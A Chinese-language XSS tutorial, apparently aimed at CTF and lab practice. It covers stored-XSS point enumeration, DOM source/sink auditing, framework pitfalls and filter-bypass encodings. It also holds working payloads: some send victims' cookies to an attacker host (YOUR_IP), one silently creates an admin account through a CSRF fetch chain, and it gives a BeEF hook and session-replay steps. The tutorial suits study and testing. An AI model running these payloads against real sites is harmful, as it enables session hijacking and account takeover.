## [g-stored] 存储型 XSS——payload 持久化在服务端，一次注入多次触发，可波及所有访问者包括管理员

### [stored-storage-points] 存储点枚举 | medium | xss;stored;injection-point | 存储点
> 任何"用户输入 - 服务端保存 - 其他页面渲染"的链路都是存储型 XSS 候选点，先枚举存储点再逐点测试。

#### 这个条目的作用
存储型 XSS 的第一步不是写 payload，而是把站里所有"会被存进数据库、以后再被渲染出来"的输入点全部找出来。点找全了，才有后面的"逐点测试、挑最疼的下手"。

#### 前置条件
- 一个注册账号（多数存储点在登录后才有）
- Burp Suite 或浏览器 F12（抓请求、看响应）
- 靶机可以是 DVWA、Pikachu、XSS-labs 或任何带留言/评论/个人资料功能的靶场

#### 第 1 步：画一条"存储链路"思维线
先理解判定公式：**用户输入 → 服务端保存 → 别的页面（或别的用户）渲染**。缺任何一环都不是存储型。比如搜索框把关键词回显在结果页，那是一次性的反射型；但"昵称"被存进数据库、之后每个帖子作者栏都渲染它，就是存储型。

#### 第 2 步：按功能清单枚举输入点
把站点的功能列一遍，逐个判断会不会落库：

| 功能 | 存储点 | 渲染场景 |
|---|---|---|
| 留言/评论/弹幕 | 评论正文 | 详情页、列表页 |
| 个人资料 | 昵称/签名/头像URL/简介 | 用户主页、评论区作者栏 |
| 富文本编辑 | 文章/工单/公告正文 | 前台展示页 |
| 上传 | 附件/图片文件名 | 下载链接、列表页 |
| 设置类 | 地址、备注、标签 | 管理后台、订单详情 |

#### 第 3 步：用无害标记探测每个点
对每个候选字段提交一串"带特征"的输入，而不是直接上 payload。标记选两种：纯文本标记 + 特殊字符标记。
```text
zzyzzy123                # 纯文本标记，用来确认"内容确实被存了"
"><'zzyzzy/<>            # 特殊字符标记，用来确认"渲染时转义没有"
```
提交后换个页面重新看：能在别处看到 `zzyzzy123`，说明确实落库并被渲染；再对比 `"><'zzyzzy/<>` 回显的状态。
> [!tip]
> 渲染时 `"` `'` `<` `>` 如果原样出现 → 直接进入第 5 步测 payload；如果变成 `&quot;` `&lt;` 之类实体 → 该字段被转义，存储成功也不触发（先记下来，跳到下一个点）。
> 预期结果：拿到一张"哪个字段存了、哪个字段转义了"的清单。

#### 第 4 步：确认渲染方式是 HTML 还是纯文本
关键区分：接口/页面是把字段值**当作 HTML 拼接**，还是**当作文本插入**。
```html
<!-- HTML 拼接（危险）：值直接进入标签结构 -->
<div class="author">INJECT</div>

<!-- 文本插入（安全）：被转义后显示 -->
<div class="author">&#60;INJECT&#62;</div>
```
操作方法：F12 打开 Elements 面板，提交带 `<b>test</b>` 的字段，刷新渲染页，看 `test` 是否变成**加粗**。加粗 = 当 HTML 渲染，危险；显示成字面 `<b>test</b>` = 被转义。

#### 第 5 步：对未转义的字段测验证 payload
对清单里"未转义"的字段，先提交无害验证 payload：
```html
<img src=x onerror=alert(document.domain)>
```
预期结果：页面弹出当前域名 → 该点确认可执行脚本，存储型 XSS 成立。
如果不行：检查文本框是否有长度/字数限制把 payload 截断了；再看看是不是只有管理员或特定角色才能看到该渲染页——换个有权限的账号看。

#### 第 6 步：富文本类存储点特殊处理
富文本编辑器（文章、工单）通常过白名单过滤（DOMPurify 等），直接贴 `<script>` 会被剥掉：
```html
<!-- 富文本常见缺口：受信任标签内嵌属性 -->
<svg><animate onbegin=alert(1)>      <!-- 部分版本漏过滤 -->
<a href="javascript:alert(1)">x</a>   <!-- 旧版本 href 校验缺失 -->
```
操作：编辑器切到"源码/HTML"模式再粘贴，不要用工具栏插入。逐个试上表 payload，观察保存后哪些属性被保留。
> [!warn]
> 先确认渲染接口返回的是 HTML 还是转义文本。只转义 `<>` 的接口即使存储成功也不触发，此时应转投 DOM XSS 思路，找前端二次拼接点（见 g-dom 组）。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 当前页能看到输入，别处看不到 | 只测了自身回显，漏了其它渲染页 | 全站翻一遍含该字段的页面（主页、列表、管理端） |
| payload 提交成功但不弹窗 | 服务端做了转义或白名单过滤 | F12 看 Elements 里实际渲染成什么样，再按 g-bypass 组升级 payload |
| 有长度限制，payload 被截断 | 表单 maxlength / 服务端截断 | 用 `<svg onload=...>` 短 payload，或把载荷放进 window.name |
| 只有管理页才渲染该字段 | 角色可见性差异 | 先注册两个普通账号互测，确认基础触发，再规划打管理员 |

#### 实战要点
- 存储点清单是打管理员的前提：管理员头像、昵称、工单内容渲染在后台页的，价值最高。
- 每个字段测三步：存没存（文本标记）→ 转没转（特殊字符标记）→ 执不执行（验证 payload）。
- 渲染页面可能和提交页面不同源路径，用全站搜索功能或爬一遍页面找渲染点。
- 记录每个点的"渲染 URL + 字段名 + 转义状态"，后面所有利用都基于这张表。
- 富文本点不要恋战，白名单没过就直接换点；普通文本框往往是最好打的。

### [stored-cookie-steal] 窃取 cookie 完整利用链 | medium | xss;cookie;exploit;beef | 盗cookie
> 从注入 payload 到数据回传的完整闭环，包含外带通道与落地接收脚本。

#### 这个条目的作用
把"弹个 alert"升级成真正有收益的利用：让受害者的 cookie 悄悄发到你的服务器，你再拿 cookie 冒充受害者登录。重点是搭建完整的"注入 → 外带 → 接收 → 重放"闭环。

#### 前置条件
- 一个能收请求的接收端：自己的 VPS（下文 `YOUR_IP` 换成它的公网 IP），或用 Burp Collaborator / webhook.site 临时替代
- 一个已确认可执行脚本的存储型 XSS 点（见 stored-storage-points）
- 受害者会用同一个浏览器访问目标站点（训练时用两个浏览器或隐身窗口模拟）

#### 第 1 步：先确认目标 cookie 有没有 HttpOnly
F12 → Application → Cookies，看目标域 cookie 的 HttpOnly 列。
- 没勾 HttpOnly → 可被 `document.cookie` 读取，走本页完整链路。
- 勾了 HttpOnly → `document.cookie` 读不到，别在这里耗时间，转 stored-hit-admin 的 CSRF 链打法。
> [!tip]
> CTF 里为了教学通常不设 HttpOnly；真实站点大都会设。所以盗 cookie 前这 10 秒检查非常关键。

#### 第 2 步：搭接收端
VPS 上用一行命令起个日志服务（收到啥记啥）：
```bash
# Linux VPS 上执行，监听 80 端口，请求路径与参数全部写进 access.log
python3 -m http.server 80 > access.log 2>&1 &
# 或者用 nc 更简单
nc -lvnp 80
```
不折腾 VPS 的话，用 webhook.site 或 Burp Collaborator 拿一个临时 URL 也能收参数（免费、够 CTF 用）。

#### 第 3 步：选外带通道
三种通道按优先级选：
```javascript
// ① 推荐：new Image()，只发一个图片请求，不跳转不弹窗，最隐蔽
new Image().src='http://YOUR_IP/c?u='+encodeURIComponent(location.href)+'&c='+document.cookie;

// ② fetch：能带更多自定义数据，但浏览器可能因 CORS 拦截读取，请求本身仍会发出
fetch('http://YOUR_IP/c?c='+document.cookie);

// ③ 极短事件版：字段长度受限时的备用
<img src=x onerror="fetch('http://YOUR_IP/c?c='+document.cookie)">
```
> [!warn]
> `document.cookie` 里可能有分号、等号等特殊字符，直接用会破坏 URL 参数格式，务必用 `encodeURIComponent` 包一层。URL 里协议写 `http://` 或 `//`（协议相对），不要写 `https`，除非接收端配了证书。

#### 第 4 步：把 payload 注入存储点
```html
<script>
new Image().src='//YOUR_IP/c?u='+encodeURIComponent(location.href)+'&c='+document.cookie;
</script>
```
提交到已确认的存储点（如评论区），自己先作为"受害者"访问渲染页验证。
预期结果：VPS 上 `access.log` 出现一行包含当前页面 URL 和 cookie 的请求。
如果不行：检查接收端防火墙是否放行 80 端口（`ufw status`）、payload 是否被过滤/截断、CSP 是否禁了外部请求（Network 面板看红色报错）。

#### 第 5 步：用日志还原 cookie
```txt
2025-01-01 10:00:01 GET /c?u=https%3A%2F%2Ftarget.com%2Fadmin&c=sessionid%3Dabc123%3Btoken%3Dxyz
```
肉眼或脚本解码后得到：`sessionid=abc123;token=xyz`，这就是受害者身份凭证。

#### 第 6 步：用 cookie 重放登录（冒充受害者）
- 浏览器方式：F12 → Application → Cookies，逐条改成受害者的 cookie 值，刷新目标页 → 直接进入受害者登录态。
- 请求方式：Burp Repeater 里把 `Cookie: sessionid=abc123;token=xyz` 原样塞进请求头发给后台接口。
预期结果：看到受害者的个人数据或后台页面 → 会话劫持成立。
> [!danger]
> 存下 cookie 后尽快用，session 有过期时间；别在自己浏览器里长期挂着别人身份，容易误操作污染数据。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| VPS 收不到任何请求 | 端口没监听 / 防火墙挡了 / payload 未触发 | 先 `pv` 或 telnet 测端口通不通；用 Burp 看浏览器是否发出请求 |
| cookie 值不完整 | 未 encodeURIComponent，分号截断了参数 | payload 里用 `encodeURIComponent(document.cookie)` |
| 弹窗验证能过，盗 cookie 不触发 | 页面 CSP 禁止外部请求 | Network 面板看拦截报错；改用页面内 keylogger 或 DOM 篡改 |
| 拿到 cookie 重放还是没权限 | HttpOnly 只挡了读取，或 session 已失效 | 检查 HttpOnly 标记；立刻重放 |

#### 实战要点
- 利用链固定五段：注入 → 外带 → 接收 → 解析 → 重放，任何一段断了整条链都不成立，逐段验证。
- `new Image()` 优先于 `location=`：前者不发新页面、不弹窗、日志量小，管理员不易察觉。
- cookie 有特殊字符必须 URL 编码；页面 URL 一起带出来，方便定位受害者当时在哪个页面。
- 有 HttpOnly 时立刻换思路（CSRF 链/读取页面内容），不要硬刚。
- CTF 交 flag 通常靠重放后的后台页面，务必跑通"重放"这最后一步。

### [stored-hit-admin] 打管理员思路 | hard | xss;stored;admin;csrf | 打管理员
> 存储型 XSS 的最大收益是"守株待兔"攻击管理员，前置条件是管理员会访问被污染页面，核心思路是把 XSS 升级成 CSRF 链路。

#### 这个条目的作用
说明白"普通用户中了存储型 XSS"和"管理员中了"的差距在哪，并给出把 XSS 升级成能打管理员的具体三套打法——重点是绕过 HttpOnly 的 CSRF 链思路。

#### 前置条件
- 一个已在普通用户侧验证可执行的存储型 XSS 点（stored-storage-points 的产出）
- 确认管理员会访问含该存储点的页面（后台工单/昵称/公告列表等）
- 两个测试账号：一个受害者、一个攻击者（CTF 里通常是题目给的）

#### 第 1 步：判定三件事，决定走哪条路
1. 管理员的 session cookie 有没有 HttpOnly → F12 看 Application → Cookies
2. 后台管理接口和前台是否同源（同 host 同端口）→ 看请求地址
3. 后台页面有没有 CSP / 是否渲染该存储点 → 源码看响应头
对照下表和结论：
| 情况 | 打法 |
|---|---|
| cookie 无 HttpOnly + 管理前端可访问 cookie 外带 | **直接盗 cookie**（沿用 stored-cookie-steal 的链路） |
| HttpOnly 或想拿权限而非 session | **CSRF 链**（本页重点） |
| 需要长期驻留、持续操作 | **BeEF/钓鱼钩子**（挂 `//YOUR_IP:3000/hook.js` 控制受害者浏览器） |

#### 第 2 步：理解 CSRF 链为什么能绕过 HttpOnly
核心一句话：**浏览器自动携带同源 cookie，fetch 后台接口根本不需要读 cookie 值**。
```txt
管理员登录态 (cookie 在浏览器里，HttpOnly 也照样随请求发送)
   -> 管理员打开被污染的页面 -> payload 里的 fetch 执行
   -> fetch('/admin/...') 是同源请求 -> 浏览器自动带上管理员 cookie
   -> 服务端以为是管理员本人 -> 操作成功
```
也就是说：HttpOnly 只挡"读"，不挡"用"。payload 不需要知道 cookie 内容，替管理员发请求即可。

#### 第 3 步：抓后台写接口的请求格式
用自己账号登录后台（或看题目给的 API 文档），Burp 抓一个"改配置/加用户"类请求，记三样：
- 请求方法（GET/POST/PUT）
- URL 路径（如 `/admin/user/add`）
- 请求体格式（JSON 还是 form）
- 是否有 CSRF token（body 或自定义头里）

#### 第 4 步：构造 CSRF 链 payload
通用模板（JSON 接口版，创建管理员账号为例）：
```html
<script>
fetch('/admin/user/add', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({user: 'hacker', role: 'admin', pass: 'hack123'})
}).then(r => r.text()).then(t => {
  new Image().src = '//YOUR_IP/finish?r=' + encodeURIComponent(t);
});
</script>
```
根据第 3 步抓到的真实接口改 method/路径/字段名。form 接口用 `FormData` 或直接拼 body：
```html
<script>
fetch('/admin/user/add', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'user=hacker&role=admin&pass=hack123'
});
</script>
```
> [!warn]
> 后台接口若带 CSRF token 校验，需要先在页面里读 token 再带上：审查页面源码找隐藏的 token 字段（如 `<meta name="csrf-token">` 或表单里的 `input[name=csrf]`），fetch 前用 `document.querySelector('meta[name=csrf-token]').content` 取出来塞头里。token 在同源页面内可以随意读。

#### 第 5 步：双账号自测（关键闭环验证）
规则：A 账号当"管理员"（或直接用题目管理员环境），B 账号提交 payload。步骤：
1. B 把 payload 存进存储点
2. A 登录后访问渲染页（模拟管理员踩雷）
3. 观察是否出现 `//YOUR_IP/finish` 请求、后台是否多出 hacker 账号
预期结果：后台出现新管理员账号 → 链路成立。
如果不行：检查 fetch 是否被 CSP 拦（Network 红错）；接口是不是真的同源；请求体格式是否与服务端期望一致（看响应状态码 400 还是 200）。

#### 第 6 步：用新账号登录后台收尾
拿创建的 `hacker` 账号登录后台，找 flag/敏感信息，或继续提权。
> [!tip]
> 打管理员前先自己注册两个账号互测，确认 payload 在"非管理页面"也触发，避免管理员视角页面结构不同导致 payload 失效——这是最常翻车的一步。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| fetch 跨域报错 | 后台接口与前台不同源 | 找同源的接口；或改用 form 提交（跨域表单可发） |
| 请求发出但 400 | 请求体字段名/格式不对 | 抓包对比你自己的合法请求，逐字段对齐 |
| 带 token 的接口 403 | CSRF token 校验 | 页面内先读 token 再带（见第 4 步 warn） |
| CSP 拦截脚本 | 后台页 CSP 严格 | 换存储点找无 CSP 的页面；或改用纯事件型短 payload |
| 管理员根本没访问 | 渲染页不常被管理员打开 | 优先选工单、公告、后台列表等管理员必看页面 |

#### 实战要点
- 优先级排序：无 HttpOnly 先盗 cookie；有 HttpOnly/要拿权限走 CSRF 链；要长期控制上 BeEF。
- "同源 fetch + 自动带 cookie"是绕过 HttpOnly 的核心，payload 全程不需要读 cookie。
- 触发条件核对：存储点可见于后台页 + 后台无 CSP（或允许同源）+ 写接口同源无 Origin 校验。
- 打的是"管理员必看页面"，不是"你能提交的页面"，选点决定成败。
- 双账号互测是最高性价比的验证手段，永远先于真实攻击。

## [g-dom] DOM XSS——纯客户端漏洞，服务器响应里看不到 payload，审计重点在前端 JS 的 source 到 sink 数据流

### [dom-source-sink] source/sink 对照表 | medium | dom-xss;source;sink | DOM型漏洞点
> DOM XSS 成立的条件是一条可控数据从 source 流入危险 sink，先建立映射表再逐条审计。

#### 这个条目的作用
DOM XSS 和反射/存储型的最大区别：Response 里永远看不到 payload，因为服务器根本没参与拼接。判断它必须理解"数据从哪来（source）、流到哪去（sink）"，本页给你一张可直接对照的映射表。

#### 前置条件
- 浏览器开发者工具（F12），会看 Network 和 Console
- 能拿到目标站点的前端 JS（Sources 面板或 JS 文件）
- 一个带前端路由/搜索/分享功能的靶场（很多 CTF 前端题都是 DOM XSS）

#### 第 1 步：记住判定铁律
> [!danger]
> **响应体无 payload，但同一 payload 在浏览器内执行 = DOM XSS。**
验证动作：注入 `?x=abc123`，Response 里搜 `abc123` 找不到 → 基本可断定走 DOM 路线，开始看前端代码。

#### 第 2 步：认识常见 source（数据入口）
```javascript
location.href / location.search / location.hash   // URL 各部分，用户可控
document.URL / document.referrer                   // 当前 URL、来源页 URL
document.cookie / window.name                      // cookie、窗口名（可被外部页面设置）
history.state                                      // 前端路由状态
postMessage 事件数据                                // 来自其它窗口/iframe 的消息
```
source 的本质：**用户能影响其内容的值**。URL 参数、hash、甚至 `window.name`（攻击者页面 `window.open` 时可指定）都是可控入口。

#### 第 3 步：认识危险 sink（执行/写入点）
```javascript
document.write()               // 直接写 HTML —— 最经典
element.innerHTML = ...        // 解析 HTML —— 最普遍
element.outerHTML = ...
element.insertAdjacentHTML(...)
eval() / setTimeout("字符串") / setInterval("字符串")   // 字符串被执行
new Function("字符串")
location.href = ... / location.assign() / location.replace()  // javascript: 变体
element.src / element.href = ...                        // javascript: 变体
```
sink 的本质：**能把字符串当代码或 HTML 处理的位置**。

#### 第 4 步：用浏览器控制台手动验证一条链
不用先读代码，直接在 Console 手工构造数据流，验证"入口可控 + 出口危险"：
```javascript
// 手工模拟：把 location.hash 塞进 innerHTML，看会不会执行
location.hash = '#<img src=x onerror=alert(document.domain)>';
// 然后去页面上找一个 innerHTML 绑定 hash 的元素……没有就不成立，纯验证手法
```
更快的做法：改 URL 的 hash/search 参数注入 `<img src=x onerror=alert(1)>`（URL 里编码成 `%3Cimg...%3E`），刷新后看是否弹窗——弹了就是有 source→sink 链，接着去代码里找具体位置。

#### 第 5 步：源码审计，反推完整数据流
在 JS 文件里搜索 sink 关键词：
```text
innerHTML  outerHTML  document.write  insertAdjacentHTML  eval(
setTimeout(  setInterval(  new Function(  location.href=  location.assign
postMessage  addEventListener('message'
```
命中后反向追踪：这个被写入的变量赋值自哪里？逐层上溯，直到某个 source。搜到如下模式即判定：
| Source | Sink | 典型漏洞代码 |
|---|---|---|
| `location.hash` | `innerHTML` | `el.innerHTML = location.hash.slice(1)` |
| `location.search` | `document.write` | `document.write('<a href="'+q+'">')` |
| `location.hash` | `eval` | `eval(location.hash.slice(1))` |
| `document.referrer` | `location.href` | `location.href = referrer` |
| `postMessage` | `innerHTML` | `window.onmessage = e => el.innerHTML = e.data` |

#### 第 6 步：构造最终验证 payload
```html
<!-- URL 中提交（hash 或 search 参数） -->
#<img src=x onerror=alert(document.domain)>
?q="><svg onload=alert(document.domain)>
```
根据第 5 步定位的具体拼接方式调整闭合（参考 g-basic 的闭合公式），刷新触发。
预期结果：弹窗显示当前域名 → DOM XSS 成立。
如果不行：eval 类 sink 里标签不生效，改用 `eval(location.hash.slice(1))` 直接注入 `alert(1)`（不带标签）；确认没有 WAF 对 URL 里的 payload 做编码。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| Response 里死活找不到 payload | 它就是 DOM XSS，别在响应里找 | 去看前端 JS 的 source→sink 链 |
| 改了 URL 不触发 | hash/search 选错参数，或数据流另有中转 | 逐个参数试；在 sink 行打断点看变量值 |
| 注入标签不弹窗 | sink 是 eval 而非 innerHTML | 换纯 JS payload：`alert(1)` 而不是 `<img>` |
| 弹窗了但报错 | payload 与代码拼接冲突（引号未闭合） | 按闭合公式补 `"` `'` `>` 和收尾注释 |

#### 实战要点
- 判定顺序固定：响应体找不到 payload → 列 source → 列 sink → 画一条可达链 → 构造 payload。
- `location.hash` 不会被发送到服务器，抓包工具看不到它，只能靠浏览器侧验证。
- eval/setTimeout 类 sink 和 innerHTML 类 sink 的 payload 完全不同，先分清再构造。
- 审计关键词优先搜 `innerHTML`、`document.write`、`eval(`、`location.`、`postMessage` 五类。
- 一条链断在哪一层（source 被截断 / 中转转义 / sink 不执行），就用哪一层的绕过（见 g-bypass）。

### [dom-framework-pits] 框架渲染坑（vue/react） | hard | dom-xss;vue;react;framework | v-html;dangerouslySetInnerHTML
> 现代框架默认转义文本，但显式开启"渲染原始 HTML"的 API 就是 DOM XSS 高危点，CTF 和 SRC 都是重灾区。

#### 这个条目的作用
Vue/React 默认会把数据当文本转义，安全；但框架都留了"渲染原始 HTML"后门（v-html / dangerouslySetInnerHTML），一旦开发者把用户数据塞进去，就开出 DOM XSS。本页教你一眼认出这些坑和正确的穷举审计法。

#### 前置条件
- 能拿到前端源码或打包产物（webpack 拆包后搜关键词，见 recon-js-analysis）
- 一个基于 Vue/React 的靶场或真实站（F12 看页面里有 `_vue_` 或 React 挂载点）
- 会用 F12 的 Sources 全局搜索（Ctrl+Shift+F）

#### 第 1 步：理解框架默认行为是"安全的"
```html
<!-- Vue：插值默认转义，安全 -->
<div>{{ userContent }}</div>

<!-- React：children 默认转义，安全 -->
<div>{props.comment}</div>
```
`{{ }}` 和 `{children}` 会把 `<` 变成实体显示成文字，永远不会执行。所以**框架本身不是漏洞，绕过默认转义的 API 才是**。

#### 第 2 步：认识 Vue 的头号坑 v-html
```html
<div v-html="userContent"></div>
```
```html
<!-- 等价写法，数据来自 URL 依然危险 -->
<div v-html="location.hash.slice(1)"></div>
```
判定链：`v-html` 的值来自接口数据（存储型/反射型）→ 前端把原始 HTML 直接插入 DOM；来自 `location.*` → 纯 DOM XSS。
验证：URL 加 `#<img src=x onerror=alert(1)>`，刷新，Vue 会把 hash 原样当 HTML 渲染 → 弹窗。
> [!danger]
> `v-html` 完全跳过 Vue 的转义。`v-text` 和 `{{ }}` 是安全的，只有 `v-html` 是雷。

#### 第 3 步：认识 React 的头号坑 dangerouslySetInnerHTML
```jsx
<div dangerouslySetInnerHTML={{ __html: props.comment }} />
```
与 Vue 同理：`{children}` 安全，唯独这个属性把字符串当 HTML 解析。
```jsx
// 危险写法
<div dangerouslySetInnerHTML={{ __html: location.hash.slice(1) }} />
```

#### 第 4 步：清点属性绑定类次要坑
```jsx
// 危险：href 绑定用户输入，可塞 javascript: 伪协议
<a href={userLink}>x</a>          // userLink="javascript:alert(1)" 即触发

// 危险：跳转函数接用户输入
window.open(userInput)            // userInput="javascript:alert(1)"

// 危险：模板引擎类化写法（Angular）
<div [innerHTML]="userContent"></div>
```
> [!tip]
> 属性绑定（`:href`/`href={}`）不转义 URL scheme，`javascript:` 能直接混进去；`window.open` 则与框架无关，常见于 SPA 路由跳转。这两个经常被查漏洞的人漏掉。

#### 第 5 步：全库穷举检索六个关键词
这是审计类题目性价比最高的一步。对打包产物（或源码目录）全局搜索：
```text
v-html              dangerouslySetInnerHTML      document.write
innerHTML           window.open                  location.href =
```
命中后对每个结果做一步判定：**写入/跳转的值，上游是否可达用户输入**（URL、接口、postMessage、存储字段）。不可达 → 无害；可达 → 漏洞，按对应 payload 验证。

#### 第 6 步：不同坑用不同 payload 验证
```html
<!-- v-html / dangerouslySetInnerHTML / innerHTML 类 -->
#<img src=x onerror=alert(document.domain)>

<!-- href 绑定 / window.open 类 -->
javascript:alert(document.domain)

<!-- eval 类（少见但存在） -->
alert(document.domain)
```
操作：把 payload 放进对应的参数/字段，刷新触发，确认后回写报告。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| `{{ }}` 里塞标签不执行 | 插值默认转义，本来就安全 | 这不是漏洞，去搜 v-html |
| 搜 `v-html` 找到了但不触发 | 值被上游过滤/截断 | 往上游追：接口数据 → 存储点 → 提交处 |
| 插了 `<img onerror>` 没反应 | payload 与插入上下文冲突 | 先在网页里看实际渲染结构再改闭合 |
| `javascript:` 在 href 里不执行 | 新版 Chrome 对部分上下文收窄 | 换事件属性或检查是否有 URL 白名单前置过滤 |

#### 实战要点
- 记住三句话：`{{ }}` 安全、`{children}` 安全、`v-html`/`dangerouslySetInnerHTML` 是雷。
- 审计固定动作：全局搜 `v-html`、`dangerouslySetInnerHTML`、`document.write`、`innerHTML`、`window.open`、`location.href =` 六个词。
- 每个命中点只问一个问题：这个值可控吗？可控即漏洞。
- 打包产物 minify 后关键词还在（字符串无法被压缩改名），webpack 拆包后照样能搜。
- 框架版本换代（Vue2→3 等）不影响这些 API 的存在，坑是设计层面留下的。

## [g-bypass] 绕过技巧——过滤不是终点，编码、事件、标签变体与截断是四大绕过方向，配合使用几乎通杀常见黑名单

### [bypass-encoding] 编码绕过 | medium | xss;bypass;encoding | 实体编码;URL编码
> 浏览器在解析 HTML 时会逐层解码，利用"服务端对码过滤、浏览器解码后执行"的差异即可绕过一次过滤。

#### 这个条目的作用
过滤器的思路是"看到危险字符/关键字就拦"，浏览器的思路是"遇到编码就先解码再解析"。两边对不上，就是绕过空间。本页教你按注入上下文选对编码层，把被过滤的 payload 用编码"骗"过服务端、在浏览器里还原执行。

#### 前置条件
- 一个已确认有过滤的注入点（先按 basic-detect-payloads 做过字符探测）
- 能看浏览器实际解析结果（F12 Elements 面板）
- 理解基本闭合上下文（basic-contexts 的四类上下文）

#### 第 1 步：先判定上下文——决定用哪层编码
> [!warn]
> 编码只在**能被浏览器解码的那个层**有效，选错层一切白搭。三问定位：
> 1. 注入点落在标签间、属性里、还是 JS 字符串里？
> 2. 服务端过滤的是字符（`<` `>`）还是关键字（`alert` `javascript:`）？
> 3. 浏览器解码的顺序：HTML 解析器先解码实体，再到属性值里的 JS 解析器。
> 结论：HTML 上下文/属性值 → 用 HTML 实体；JS 上下文 → 用 JS 转义。

#### 第 2 步：背下三层编码对照表
| 层 | 编码形式 | 示例 | 解码时机 |
|---|---|---|---|
| HTML 实体 | `&lt;` `&#60;` `&#x3c;` | `&#60;img&#62;` | HTML 解析器（最早） |
| URL | `%3C` `%22` | `%3Cscript%3E` | URL 解码后进参数 |
| JS 转义 | `\x3c` `\u003c` | `\u0061lert(1)` | JS 字符串/标识符解析 |

#### 第 3 步：过滤 `< >` 字符时——用 HTML 实体包住标签
服务端把尖括号删了或转义了，但属性值本身能被实体编码：
```html
<!-- 过滤 < > 但放行引号属性时可以整体实体编码（HTML 解析器先还原再解析） -->
&#60;img src=x onerror=alert(1)&#62;

<!-- 更常见的半编码：只对关键字里某个字母做实体，绕过敏感词匹配 -->
<img src=x onerror=&#97;lert(1)>
```
原理：`&#97;` 在属性值里被 HTML 解析器解码成 `a`，事件处理器里 JS 实际拿到的是 `alert(1)`，但服务端字符串匹配 `alert` 时看到的是 `&#97;lert`，匹配不上。
预期结果：F12 的 Elements 面板里看到该属性被还原为 `onerror="alert(1)"` 且弹窗。
如果不行：确认注入点确实是"属性值"而非"纯文本"；如果连 `<`、`&` 都被双重转义（变成 `&amp;lt;`），说明有**双重编码**，先看后面第 6 步。

#### 第 4 步：过滤 `javascript:` 关键字时——href 属性内用实体
```html
<!-- href 属性里，HTML 实体先被解码成 javascript:，再被识别为协议 -->
<a href="jav&#x61;script:alert(1)">x</a>
<a href="&#106;avascript:alert(1)">x</a>
```
操作：把它交给用户点击（或配合 `onclick` 自动触发），点击后执行。
> [!warn]
> 这个只在 **href/src/action 属性**（HTML 上下文）有效。同样的实体塞进**事件属性值**（JS 上下文）无效——JS 解析器不认识 HTML 实体，那里要用第 5 步的 JS 转义。

#### 第 5 步：过滤 `alert` 等 JS 关键字时——JS 转义
事件属性值是 JS 上下文，用 JS 字符串/标识符转义：
```html
<!-- 方案 A：函数名用 unicode 转义（JS 标识符支持 \u 转义，直接在事件里写） -->
<img src=x onerror="\u0061lert(1)">

<!-- 方案 B：字符串内用 \x / \u，再交给 eval 执行（过滤 eval 时可用编码后的名字） -->
<img src=x onerror="eval('\x61lert(1)')">
```
原理：方案 A 里 `\u0061` 在 JS 解析标识符时还原成 `a`；方案 B 里 `'\x61lert(1)'` 字符串解析完是 `'alert(1)'`，eval 再执行。
> [!danger]
> `\x` 十六进制转义**不能**用于标识符（`\x61lert(1)` 直接写在事件里是语法错误），只能出现在字符串字面量里配 eval 用；标识符位置只能用 `\u`。两者别搞混。

#### 第 6 步：URL 编码的正确打开方式
URL 编码（`%3C`）只在"从 URL 进参数"这一层被解码，用于应付"请求被中间层过滤"，不解决服务器响应后的过滤：
```http
GET /search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1
```
> [!warn]
> 浏览器地址栏里手动输入的 payload 会被浏览器自动 URL 编码一次，抓包软件（Burp）里再改一次，控制器里看的是解码后实体；若服务端把接收到的值**再编码一次**放进页面（双重编码），实体就变成 `&amp;lt;`，需要继续观察实际渲染再设计。判断方法：F12 Elements 看最终 DOM 里 payload 长什么样，以它为准。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 属性里实体编码不执行 | 注入点不是属性上下文/实体被双重转义 | Elements 面板看最终 DOM；确认是 `&#` 而非 `&amp;#` |
| 事件属性里用 `&#97;lert` 不弹 | 事件属性是 JS 上下文，不认 HTML 实体 | 改成 `\u0061lert(1)` 或配 eval 的 `\x61` |
| `\x61` 直接写在事件里报语法错 | hex 转义不能用于标识符 | 换 `\u0061`，或包进字符串再 eval |
| 实体解码后 alert 仍被拦 | 过滤发生在解码后的 JS 执行链（少见） | 组合其他绕过层：事件变体 + 空白符 + 截断（见 g-bypass 其他条目） |
| 怎么编码都不触发 | 上下文判定就错了 | 退回 basic-contexts 重新定上下文，再选编码层 |

#### 实战要点
- 固定的选题流程：定上下文（HTML/属性/JS）→ 看过滤对象（字符/关键字）→ 选编码层（实体/URL/JS 转义）。
- HTML 实体用于属性与标签上下文；JS 转义用于事件/script 上下文；URL 编码只处理进参这一层。
- `&#x61;`（十六进制）、`&#97;`（十进制）等价，都可用；过滤了 `&#` 前缀就换大小写/空白变体。
- 观察以 **F12 Elements 还原后的 DOM** 为准，别猜服务端转了几层。
- 编码绕过失败不要死磕一层，按 编码 → 事件 → 变体 → 截断 的顺序升级（见 g-bypass 其余条目）。